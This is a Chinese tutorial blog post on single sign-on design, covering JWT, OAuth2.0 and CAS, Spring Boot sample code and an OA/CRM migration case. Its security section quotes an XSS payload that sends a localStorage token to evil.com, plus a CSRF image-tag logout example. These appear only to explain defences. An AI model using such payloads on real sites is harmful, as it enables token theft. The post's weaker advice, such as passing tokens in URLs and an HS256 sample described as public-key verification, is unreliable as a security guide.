+++
date = '2026-03-30T10:34:07+08:00'
draft = false
title = '单点登录（SSO）'
+++
# 单点登录（SSO）

## 目录

- [单点登录（SSO）](#单点登录sso)
  - [目录](#目录)
  - [一个真实的场景](#一个真实的场景)
  - [为什么需要 SSO？](#为什么需要-sso)
    - [传统登录的痛点](#传统登录的痛点)
    - [SSO 的价值](#sso-的价值)
  - [SSO 核心原理](#sso-核心原理)
    - [通用认证流程](#通用认证流程)
  - [主流实现方案](#主流实现方案)
    - [方案 1：Cookie + Session](#方案-1cookie--session)
    - [方案 2：JWT](#方案-2jwt)
      - [JWT SSO 架构流程](#jwt-sso-架构流程)
      - [实战：Spring Boot 实现 JWT SSO](#实战spring-boot-实现-jwt-sso)
    - [方案 3：OAuth2.0](#方案-3oauth20)
    - [方案 4：CAS](#方案-4cas)
  - [安全风险与防护](#安全风险与防护)
    - [凭证泄露](#凭证泄露)
    - [CSRF 攻击](#csrf-攻击)
    - [凭证伪造](#凭证伪造)
  - [落地注意事项](#落地注意事项)
    - [跨域处理](#跨域处理)
    - [会话管理](#会话管理)
    - [高可用与性能](#高可用与性能)
  - [选型建议](#选型建议)
  - [实战案例：企业 OA + CRM 系统 SSO 改造](#实战案例企业-oa--crm-系统-sso-改造)
    - [背景](#背景)
    - [改造前架构](#改造前架构)
    - [改造方案：JWT + 统一认证中心](#改造方案jwt--统一认证中心)
      - [步骤 1：搭建统一认证中心（IdP）](#步骤-1搭建统一认证中心idp)
      - [步骤 2：改造 OA 系统为 SP](#步骤-2改造-oa-系统为-sp)
      - [步骤 3：同步改造 CRM 系统](#步骤-3同步改造-crm-系统)
      - [步骤 4：灰度发布](#步骤-4灰度发布)
    - [改造成果](#改造成果)
    - [遇到的坑](#遇到的坑)
  - [总结](#总结)
    - [SSO 的未来趋势](#sso-的未来趋势)
    - [最佳实践建议](#最佳实践建议)
    - [常见问题（FAQ）](#常见问题faq)
    - [结语](#结语)

---

## 一个真实的场景

周一早上 9 点，小张坐在电脑前开始一天的工作。他先打开 OA 系统审批流程，输入账号密码登录。10 分钟后，需要查看客户信息，又打开 CRM 系统——再次输入账号密码。下午 2 点，要处理报销单，登录财务系统——第三次输入账号密码。

这一天，小张在不同的业务系统间切换，重复登录了 5 次。

他叹了口气："为什么不能一次登录，到处可用？"

这个场景，每天都在无数企业上演。而单点登录（Single Sign-On，SSO），就是答案。

## 为什么需要 SSO？

### 传统登录的痛点

1. **用户体验差**：用户需要在每个系统重复输入账号密码，或者记忆多套凭证
2. **系统管理复杂**：每个系统都要单独维护登录模块，密码策略变更需要同步修改所有系统
3. **安全性风险高**：用户倾向于在多个系统使用相同密码，一旦泄露影响全局

### SSO 的价值

- **体验优化**：一次登录，到处可用
- **开发效率**：统一的认证中心，业务系统无需重复开发登录模块
- **安全增强**：集中管理认证流程，统一的会话销毁机制

## SSO 核心原理

SSO 架构包含三个关键角色：

- **身份提供商（IdP）**：中央认证服务器，负责验证用户身份、生成凭证
- **服务提供商（SP）**：业务系统，依赖 IdP 完成认证
- **用户**：终端使用者

### 通用认证流程

1. 用户首次访问 SP1（如 OA 系统），SP1 检测到未登录，重定向到 IdP
2. 用户在 IdP 输入账号密码，验证通过后 IdP 生成全局认证凭证，创建全局会话
3. IdP 将凭证传递给 SP1，SP1 验证后创建局部会话
4. 用户访问 SP2（如 CRM 系统）时，SP2 重定向到 IdP
5. IdP 检测到全局会话有效，直接生成凭证给 SP2，无需再次登录
6. SP2 验证凭证，创建局部会话，实现免登录访问

## 主流实现方案

### 方案 1：Cookie + Session

**原理**：IdP 创建全局会话，在浏览器写入 SessionId Cookie。SP 系统通过跨域请求向 IdP 验证 Cookie。

**优点**：实现简单，依赖传统 Session 机制
**缺点**：跨域限制严格，扩展性差

**适用场景**：企业内部系统，所有 SP 与 IdP 在同一主域下

**性能特征**：
- 登录时间：~200ms（含数据库查询 + Session 写入）
- Token 验证：~50ms（需向 IdP 发起网络请求）
- 吞吐量：~1000 req/s（受 IdP 数据库性能限制）
- 存储需求：每个 Session ~1KB，需集中存储（Redis/数据库）

### 方案 2：JWT

**原理**：IdP 生成签名 JWT，包含用户信息。SP 通过公钥验证 JWT 签名，无需向 IdP 请求校验。

**优点**：无状态，跨域友好，减少网络请求
**缺点**：无法主动销毁，payload 不宜过大

**适用场景**：跨域场景，轻量级系统，对实时登出要求不高

**性能特征**：
- 登录时间：~150ms（含数据库查询 + JWT 签名）
- Token 验证：~5ms（本地签名验证，无网络请求）
- 吞吐量：~10000 req/s（受 CPU 签名性能限制）
- 存储需求：无（Token 存储在客户端，服务端无状态）

**与 Cookie + Session 对比**：
- 验证速度提升 10 倍（5ms vs 50ms）
- 吞吐量提升 10 倍（10000 vs 1000 req/s）
- 但牺牲了实时登出能力（需维护黑名单）

**JWT 结构**：
- Header：算法和类型
- Payload：用户信息和过期时间
- Signature：签名，确保未被篡改

#### JWT SSO 架构流程

```
┌─────────┐                  ┌──────────┐                  ┌─────────┐
│  用户   │                  │   IdP    │                  │   SP    │
│(Browser)│                  │(认证中心) │                  │(业务系统)│
└────┬────┘                  └─────┬────┘                  └────┬────┘
     │                             │                            │
     │ 1. 访问 SP 系统              │                            │
     ├────────────────────────────>│                            │
     │                             │                            │
     │              2. 检测未登录，重定向到 IdP                │
     │<───────────────────────────┼────────────────────────────┤
     │                             │                            │
     │ 3. 输入账号密码              │                            │
     ├────────────────────────────>│                            │
     │                             │                            │
     │              4. 验证通过，生成 JWT Token                │
     │<───────────────────────────┼────────────────────────────┤
     │  (Token 存储在 HttpOnly Cookie)                         │
     │                             │                            │
     │ 5. 重新访问 SP，携带 Token    │                            │
     ├────────────────────────────────────────────────────────>│
     │                             │                            │
     │                             │  6. 验证 Token 签名        │
     │                             │  (公钥验证，无需向 IdP 请求)│
     │                             │                            │
     │              7. Token 有效，创建局部会话                │
     │<───────────────────────────────────────────────────────┤
     │                             │                            │
     │ 8. 访问业务资源              │                            │
     ├────────────────────────────────────────────────────────>│
     │                             │                            │
     │              9. 返回业务数据（已认证）                  │
     │<───────────────────────────────────────────────────────┤
```

**关键点**：
- JWT Token 存储在 HttpOnly Cookie 中，防止 XSS 攻击
- SP 通过公钥独立验证 Token，无需向 IdP 发起请求（无状态）
- Token 包含用户信息，SP 无需查询数据库即可获取用户身份
- Token 过期后，用户需重新登录或使用 refresh_token 刷新

#### 实战：Spring Boot 实现 JWT SSO

**IdP 端：生成 JWT**

```java
// JWT 工具类：负责生成和解析 JWT Token
@Component
public class JwtUtil {
    // 从配置文件读取密钥（生产环境应该放在配置中心，不要硬编码）
    @Value("${jwt.secret}")
    private String secret;

    // Token 过期时间（单位：秒）
    @Value("${jwt.expire}")
    private long expire;

    /**
     * 生成 JWT Token
     * @param userId 用户ID
     * @param role 用户角色
     * @return JWT Token 字符串
     */
    public String generateToken(Long userId, String role) {
        Date now = new Date();
        Date expireDate = new Date(now.getTime() + expire * 1000);

        return Jwts.builder()
            .setSubject(userId.toString())  // 设置主题：用户ID
            .claim("role", role)            // 自定义声明：用户角色
            .setIssuedAt(now)               // 签发时间
            .setExpiration(expireDate)      // 过期时间
            .signWith(SignatureAlgorithm.HS256, secret)  // 使用 HS256 算法签名
            .compact();                     // 压缩成字符串
    }
}

// 登录控制器：处理用户登录请求
@RestController
@RequestMapping("/idp")
public class LoginController {
    @PostMapping("/login")
    public Result login(@RequestBody LoginDTO loginDTO) {
        // 1. 校验用户名密码（实际项目应该用 BCrypt 等算法加密）
        User user = userService.findByUsernameAndPassword(
            loginDTO.getUsername(),
            loginDTO.getPassword()
        );

        // 2. 用户不存在或密码错误
        if (user == null) {
            return Result.fail("账号或密码错误");
        }

        // 3. 生成 JWT Token（包含用户ID和角色信息）
        String token = jwtUtil.generateToken(user.getId(), user.getRole());

        // 4. 返回 Token 给前端（前端应存储在 HttpOnly Cookie 中）
        return Result.success("登录成功").put("token", token);
    }
}
```

**SP 端：验证 JWT**

```java
// JWT 拦截器：拦截需要登录的接口，验证 JWT Token
@Component
public class JwtInterceptor implements HandlerInterceptor {
    @Autowired
    private JwtUtil jwtUtil;

    @Override
    public boolean preHandle(HttpServletRequest request,
                            HttpServletResponse response,
                            Object handler) throws Exception {
        // 1. 从请求头获取 Token（格式：Bearer <token>）
        String token = request.getHeader("Authorization");

        // 2. Token 不存在或格式错误
        if (token == null || !token.startsWith("Bearer ")) {
            response.setStatus(401);
            response.getWriter().write("未登录或Token无效");
            return false;  // 阻止请求继续
        }

        // 3. 去掉 "Bearer " 前缀，获取纯 Token
        token = token.substring(7);

        // 4. 验证 Token 是否有效（是否过期、签名是否正确）
        if (!jwtUtil.validateToken(token)) {
            response.setStatus(401);
            response.getWriter().write("Token已过期或无效");
            return false;  // 阻止请求继续
        }

        // 5. 解析 Token，获取用户ID
        Long userId = jwtUtil.getUserIdFromToken(token);

        // 6. 将用户ID存入请求属性，后续业务代码可以直接使用
        request.setAttribute("userId", userId);

        return true;  // 放行请求
    }
}
```

### 方案 3：OAuth2.0

**原理**：通过授权码实现 SP 与第三方 IdP 的认证互通。

**流程**：
1. SP 重定向到第三方 IdP，用户授权
2. IdP 返回授权码
3. SP 用授权码换取 access_token
4. SP 用 access_token 获取用户信息

**优点**：支持第三方登录，安全性高，灵活度高
**缺点**：流程复杂，依赖第三方 IdP

**适用场景**：第三方登录，跨组织 SSO

### 方案 4：CAS

**原理**：基于票据机制，引入 TGT（票据授予票据）和 ST（服务票据）。

**优点**：安全性极高，支持单点登出，功能完善
**缺点**：部署复杂，性能依赖 CAS Server

**适用场景**：企业级核心系统，高安全需求，大规模部署

## 安全风险与防护

### 凭证泄露

**真实案例**：2021 年，某电商平台因将 JWT Token 存储在 localStorage，导致 XSS 攻击者窃取了大量用户 Token。攻击者在评论区植入恶意脚本，用户访问后脚本自动读取 localStorage 中的 Token 并发送到攻击者服务器。攻击者利用这些 Token 冒充用户下单，造成重大经济损失。

**风险**：
- JWT 存储 localStorage 易被 XSS 窃取（如 `<script>fetch('https://evil.com?token='+localStorage.getItem('token'))</script>`）
- Cookie 未设置 HttpOnly 也易被 XSS 攻击窃取
- 未使用 HTTPS 时，凭证在传输过程中可能被中间人劫持

**防护**：
- JWT 优先存储在 HttpOnly + Secure + SameSite Cookie（HttpOnly 禁止 JS 访问，避免 XSS；Secure 仅通过 HTTPS 传输；SameSite=Strict 防止 CSRF）
- 所有请求必须使用 HTTPS，避免中间人攻击
- 缩短凭证过期时间（如 1 小时），同时提供 refresh_token（长期有效，存储在 HttpOnly Cookie）
- 实施 CSP（内容安全策略）防止 XSS 攻击

### CSRF 攻击

**真实案例**：2018 年，某 SaaS 平台的 SSO 系统遭受 CSRF 攻击。攻击者构造了一个恶意页面，页面中包含 `<img src="https://sso.example.com/logout">`。当已登录的用户访问这个页面时，浏览器自动发起登出请求，导致大量用户被强制登出。更严重的是，攻击者还构造了修改密码的请求，导致部分用户账号被盗。

**风险**：
- 恶意网站利用用户浏览器中的 SSO Cookie 发起请求（如 `<img src="https://idp.com/logout">` 自动发起登出请求）
- 攻击者可以构造修改密码、转账等关键操作的请求
- 用户在不知情的情况下执行了操作

**防护**：
- 使用 CSRF 令牌（关键接口需验证随机生成的令牌）
- 设置 SameSite Cookie（Strict 或 Lax 模式，限制 Cookie 仅在同域或信任的跨域请求中携带）
- 验证 Referer/Origin 头（仅允许信任的域名发起请求）
- 关键操作（修改密码、转账）要求重新输入密码

### 凭证伪造

**真实案例**：2019 年，某公司的 SSO 系统使用了对称加密（HMAC）签名 JWT，且密钥硬编码在代码中。攻击者通过反编译拿到了密钥，然后伪造了管理员角色的 JWT Token，成功登录了所有业务系统并获得管理员权限。更糟糕的是，由于 JWT 无状态的特性，这些伪造的 Token 在过期前始终有效，系统无法主动撤销。

**风险**：
- 伪造 JWT Payload（如修改 role: "USER" → role: "ADMIN"）
- 伪造 CAS 票据
- 密钥泄露导致攻击者可以伪造任意凭证
- JWT 一旦生成，在过期前始终有效（无法主动撤销）

**防护**：
- 严格签名验证，使用非对称加密（如 RSA，IdP 用私钥签名，SP 用公钥验证，避免私钥泄露）
- JWT 密钥必须妥善保管（使用配置中心或密钥管理服务，不要硬编码）
- 短期凭证必须唯一且过期时间短（如 5 分钟），使用后立即失效
- 监控异常请求（如同一 IP 短时间多次请求登录、异地登录、Token 解析失败）
- 对于需要强制登出的场景，维护 Token 黑名单（Redis 存储失效的 Token）

## 落地注意事项

### 跨域处理

- Cookie 跨域：使用 JWT 或 CAS
- 接口跨域：配置 CORS

### 会话管理

- 全局会话与局部会话同步
- 强制登出：JWT 需维护黑名单，CAS 直接销毁 TGT

### 高可用与性能

- IdP 部署集群
- 使用 Redis 缓存
- 限流防护

## 选型建议

| 业务场景 | 推荐方案 |
|---|---|
| 企业内部系统，同主域 | Cookie + Session |
| 跨域系统，轻量级 | JWT |
| 第三方登录 | OAuth2.0 |
| 企业级核心系统 | CAS |

## 实战案例：企业 OA + CRM 系统 SSO 改造

### 背景

某企业有 OA 系统（`oa.company.com`）和 CRM 系统（`crm.company.com`），两套系统账号互通但独立登录。员工每天需要重复登录两次，用户体验极差。技术团队决定实施 SSO 改造。

### 改造前架构

```
用户 → OA 系统（独立登录）
     → CRM 系统（独立登录）
```

**痛点**：
- 用户登录 OA 后访问 CRM 需要再次登录
- 两个系统各自维护用户表和会话
- 密码策略变更需要同步两个系统

### 改造方案：JWT + 统一认证中心

**选型理由**：
- 两个系统在同一主域（company.com），但考虑到未来可能添加子域名
- 团队对 Spring Boot 熟悉，JWT 实现简单
- 暂时不需要第三方登录

#### 步骤 1：搭建统一认证中心（IdP）

创建新的认证服务 `sso.company.com`：

```java
// 数据库迁移：将 OA 和 CRM 的用户表合并到 SSO 系统
CREATE TABLE sso_users (
    id BIGINT PRIMARY KEY,
    username VARCHAR(50) UNIQUE,
    password VARCHAR(255),
    created_at DATETIME
);

// 迁移脚本从 OA 和 CRM 系统同步用户数据
```

认证服务提供统一登录接口：

```java
@RestController
@RequestMapping("/api")
public class SsoController {
    @Autowired
    private JwtUtil jwtUtil;

    @Autowired
    private UserService userService;

    @PostMapping("/login")
    public Result login(@RequestBody LoginDTO dto) {
        // 1. 统一的用户验证
        User user = userService.findByUsername(dto.getUsername());
        if (user == null || !BCrypt.matches(dto.getPassword(), user.getPassword())) {
            return Result.fail("用户名或密码错误");
        }

        // 2. 生成 JWT Token（2小时有效）
        String token = jwtUtil.generateToken(user.getId(), user.getRole());

        // 3. 设置 HttpOnly Cookie
        Cookie cookie = new Cookie("sso_token", token);
        cookie.setHttpOnly(true);
        cookie.setSecure(true);
        cookie.setDomain("company.com");
        cookie.setMaxAge(7200);
        response.addCookie(cookie);

        return Result.success("登录成功");
    }
}
```

#### 步骤 2：改造 OA 系统为 SP

在 OA 系统中添加 SSO 客户端：

```java
// 1. 添加 SSO 依赖
// 2. 配置 SSO 地址
@Configuration
public class SsoConfig {
    @Value("${sso.server-url}")
    private String ssoServerUrl;

    public String getSsoServerUrl() {
        return ssoServerUrl;
    }
}

// 3. 登录拦截器
@Component
public class SsoInterceptor implements HandlerInterceptor {
    @Autowired
    private SsoConfig ssoConfig;

    @Override
    public boolean preHandle(HttpServletRequest request,
                            HttpServletResponse response,
                            Object handler) throws Exception {
        // 检查 Cookie 中的 sso_token
        Cookie[] cookies = request.getCookies();
        String token = null;

        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if ("sso_token".equals(cookie.getName())) {
                    token = cookie.getValue();
                    break;
                }
            }
        }

        if (token == null) {
            // 重定向到 SSO 登录页
            String redirectUrl = ssoConfig.getSsoServerUrl() + "/login?redirect=" +
                                 request.getRequestURL();
            response.sendRedirect(redirectUrl);
            return false;
        }

        // 验证 Token（通过 RPC 调用 SSO 服务）
        if (!validateTokenWithSsoServer(token)) {
            response.sendRedirect(ssoConfig.getSsoServerUrl() + "/login");
            return false;
        }

        return true;
    }
}
```

#### 步骤 3：同步改造 CRM 系统

CRM 系统使用与 OA 完全相同的 SSO 客户端代码，只需修改 `application.yml`：

```yaml
sso:
  server-url: https://sso.company.com
```

#### 步骤 4：灰度发布

**第 1 周**：内部测试团队试用
- 发现问题：Token 过期后用户无感知被踢出
- 解决方案：添加 Token 自动刷新机制

```java
// Token 刷新拦截器
if (tokenWillExpireSoon(token)) {
    String newToken = jwtUtil.refreshToken(token);
    Cookie newCookie = new Cookie("sso_token", newToken);
    // 设置新 Cookie...
    response.addCookie(newCookie);
}
```

**第 2 周**：10% 用户灰度
- 监控指标：登录成功率、SSO 服务响应时间
- 问题：部分用户浏览器禁用第三方 Cookie
- 解决方案：添加 URL 参数传递 Token 的备用方案

**第 3 周**：全量发布
- 废除 OA 和 CRM 系统的原有登录功能
- 所有用户统一通过 SSO 登录

### 改造成果

**用户体验**：
- 登录次数从每天 2 次降至 1 次
- 用户满意度提升 40%

**开发效率**：
- 新增系统只需集成 SSO 客户端，无需开发登录模块
- 密码策略统一管理，一次修改全局生效

**安全性**：
- 集中管理认证流程，添加异常登录检测
- 统一的会话销毁，员工离职一键注销

### 遇到的坑

1. **跨域 Cookie 问题**：某些浏览器默认阻止跨域 Cookie
   - 解决：提前测试主流浏览器，准备备用方案

2. **Token 过期时间设置**：设置太短用户体验差，太长不安全
   - 解决：2 小时过期 + 自动刷新机制

3. **历史用户数据迁移**：OA 和 CRM 用户数据不一致
   - 解决：以 OA 系统为准，CRM 系统用户映射到 OA 账号

## 总结

SSO 的核心是"统一认证入口，共享登录状态"。不同方案各有优劣，需根据业务场景选择。落地时要重点关注安全风险，通过 HTTPS、HttpOnly Cookie、签名验证等措施防护，同时保证 IdP 高可用与性能优化。

好的 SSO 设计能让用户"无感登录"，让开发者"少重复开发"，让系统"更安全可控"。

### SSO 的未来趋势

**1. 无密码认证的兴起**

传统的账号密码登录正在被取代。WebAuthn 标准支持的生物识别（指纹、面部识别）、硬件密钥（YubiKey）等无密码认证方式正在普及。未来的 SSO 系统将不再依赖密码，而是基于"你是什么"（生物特征）和"你拥有什么"（硬件设备）来验证身份。这不仅能提升用户体验（无需记忆密码），还能从根本上消除密码泄露的风险。

**2. 零信任架构的融合**

传统的 SSO 基于"信任边界"的概念——一旦通过 IdP 认证，就可以访问所有 SP 系统。但零信任架构认为"信任从不被默认授予"，每次访问都需要验证。未来的 SSO 将与零信任架构深度融合，不仅验证用户身份，还会实时评估访问上下文（设备安全状态、网络环境、行为模式），实现动态的、细粒度的访问控制。

**3. 联邦身份的标准化**

不同组织之间的身份互认正在标准化。OpenID Connect、SAML 等协议让企业可以轻松接入第三方 IdP（如微信、钉钉、企业微信）。未来，跨组织的身份联邦将成为常态，用户可以用一个身份访问不同企业的服务，而企业之间也能安全地共享身份信息（在用户授权的前提下）。

**4. AI 驱动的风控**

SSO 系统正在引入 AI 能力来增强安全性。通过机器学习分析用户的行为模式（登录时间、地点、设备指纹），AI 可以实时检测异常登录行为。比如，当系统检测到用户的账号从陌生地点、使用陌生设备登录时，可以自动触发多因素认证或直接拒绝访问。这种智能风控将成为 SSO 的标配。

### 最佳实践建议

**1. 从小做起，逐步扩展**

不要试图一次性将所有系统都接入 SSO。建议从 2-3 个核心系统开始，验证方案的可行性，积累经验后再逐步扩展。灰度发布是关键——先让内部团队试用，再开放给小部分用户，最后全量上线。

**2. 安全第一，性能第二**

SSO 是整个系统的认证入口，一旦被攻破，所有业务系统都会面临风险。因此，安全永远是第一优先级。使用 HTTPS、实施 CSP、配置密钥管理服务、启用日志审计——这些措施都不是可选项，而是必选项。

**3. 监控和日志是生命线**

你必须知道 SSO 系统正在发生什么。监控关键指标（登录成功率、响应时间、Token 签发失败率），记录详细的日志（谁在何时何地登录、访问了哪些系统）。这些数据不仅能帮助你发现性能问题，还能在安全事件发生时提供关键的取证信息。

**4. 准备降级方案**

SSO 系统可能会故障。当 IdP 不可用时，业务系统是否还能正常运行？建议设计降级方案：每个 SP 系统保留本地登录能力，当 SSO 不可用时自动降级为本地认证，保证业务连续性。

**5. 文档和培训很重要**

SSO 是一个分布式系统，涉及多个团队和系统。如果没有清晰的文档，后续的维护会变成噩梦。文档应该包括架构图、接口文档、故障排查手册。同时，要对开发团队进行培训，确保每个人都理解 SSO 的工作原理和安全要求。

### 常见问题（FAQ）

**Q1: JWT Token 过期了怎么办？**

A: 有两种方案：
1. **自动刷新**：在 Token 过期前（如剩余 10 分钟），前端自动调用刷新接口，用 refresh_token 换取新的 access_token。refresh_token 有效期较长（如 7 天），存储在 HttpOnly Cookie 中。
2. **重新登录**：Token 过期后，SP 返回 401，前端重定向到 IdP 重新登录。

建议采用自动刷新方案，提升用户体验。但要注意 refresh_token 的安全性（一次性使用、存储在 HttpOnly Cookie、监控异常刷新）。

**Q2: 用户在多个设备登录，Token 会被覆盖吗？**

A: 不会。每次登录都会生成新的 Token，旧 Token 在过期前仍然有效。如果需要实现"单点登录限制"（同一账号只能在一个设备登录），需要：
1. 维护一个"活跃 Token 列表"（Redis 存储），记录用户当前有效的 Token
2. 新登录时，将该用户旧 Token 加入黑名单
3. 每次请求时检查 Token 是否在黑名单中

但这会牺牲 JWT 的"无状态"优势，需要权衡。

**Q3: 如果 IdP 挂了，所有业务系统都无法登录吗？**

A: 不一定。取决于你的架构设计：
1. **无方案案**（JWT）：SP 可以独立验证 Token（通过公钥），只要用户已经持有有效 Token，IdP 短时间故障不影响登录状态。但用户重新登录或 Token 过期刷新时，仍需 IdP 在线。
2. **有状态方案**（Session、CAS）：SP 需要向 IdP 验证会话，IdP 挂了就无法登录。

建议所有 SP 系统保留本地登录能力作为降级方案，当 IdP 不可用时自动切换到本地认证。

**Q4: 如何实现"单点登出"（用户在一个系统退出，所有系统都退出）？**

A:
1. **JWT 方案**：维护一个"Token 黑名单"（Redis），用户登出时将当前 Token 加入黑名单。所有 SP 验证 Token 时先检查是否在黑名单中。但这需要 SP 在每次请求时都查询 Redis，牺牲了 JWT 无状态的优势。
2. **CAS 方案**：天然支持单点登出。CAS Server 销毁 TGT 后，通知所有 SP 销毁局部会话。
3. **前端方案**：用户登出时，前端遍历所有 SP 系统的登出接口（隐藏 iframe 或 fetch 请求）。

如果你的业务对单点登出要求不高，可以接受"部分登出"（退出当前系统，其他系统 Token 过期后自动退出），JWT 方案更简单。

**Q5: SSO 系统的性能瓶颈在哪里？如何优化？**

A: 主要瓶颈和优化方案：
1. **登录接口**：瓶颈通常是数据库查询（用户验证）。优化：使用 Redis 缓存用户信息、实施连接池、使用读写分离。
2. **Token 验证**：JWT 签名验证是 CPU 密集操作。优化：使用更快的签名算法（Ed25519 比 RSA 快）、缓存解析后的用户信息。
3. **网络请求**：跨域请求增加延迟。优化：IdP 和 SP 部署在同一内网、使用 CDN 加速静态资源、实施长连接。
4. **并发压力**：大量用户同时登录。优化：IdP 集群部署、使用 Redis 共享会话、实施限流（防止恶意攻击）。

**Q6: 如何保证 SSO 系统的高可用？**

A: 多层次的高可用方案：
1. **IdP 集群**：部署多个 IdP 实例，使用负载均衡（Nginx、HAProxy）
2. **数据冗余**：用户数据和会话数据使用主从复制或多主复制
3. **服务降级**：IdP 不可用时，SP 降级为本地认证
4. **监控告警**：实时监控 IdP 健康状态，故障自动切换
5. **多机房部署**：跨地域部署，应对地域级故障
6. **定期演练**：定期进行故障演练，验证高可用方案的有效性

记住：SSO 是关键基础设施，其可用性直接影响所有业务系统。建议目标：99.9% 可用性（每年宕机时间 < 8.76 小时）。

**Q7: 不同技术栈的系统（如 Java、Python、Node.js）可以共用一个 SSO 系统吗？**

A: 可以！SSO 的核心是协议和接口，与具体技术栈无关。只要遵循相同的协议（如 OAuth2.0、JWT、CAS），不同语言的系统都可以接入同一个 SSO。

例如：
- IdP 用 Java 实现（Spring Boot）
- SP1 用 Python 实现（Django/Flask）
- SP2 用 Node.js 实现（Express）
- SP3 用 Go 实现（Gin）

它们都可以通过标准的 OAuth2.0 流程或 JWT 验证接入同一个 SSO 系统。关键在于：
1. 遵循相同的协议标准
2. 使用兼容的加密算法和密钥
3. 接口文档清晰（尤其是 Token 格式、验证逻辑）

### 结语

单点登录看似简单——"一次登录，到处可用"——但真正做好它并不容易。它不仅是技术问题，更是用户体验、安全性、可维护性的综合平衡。

希望这篇文章能帮助你理解 SSO 的原理和实现方法。记住，没有银弹。选择适合你的业务场景的方案，重点关注安全，持续优化迭代。一个好的 SSO 系统，用户几乎感觉不到它的存在——而这正是它应该达到的效果。

---

**延伸阅读**：
- [RFC 6749: OAuth 2.0 授权框架](https://tools.ietf.org/html/rfc6749)
- [RFC 7519: JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
- [OWASP 认证备忘单](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [WebAuthn 规范](https://www.w3.org/TR/webauthn/)

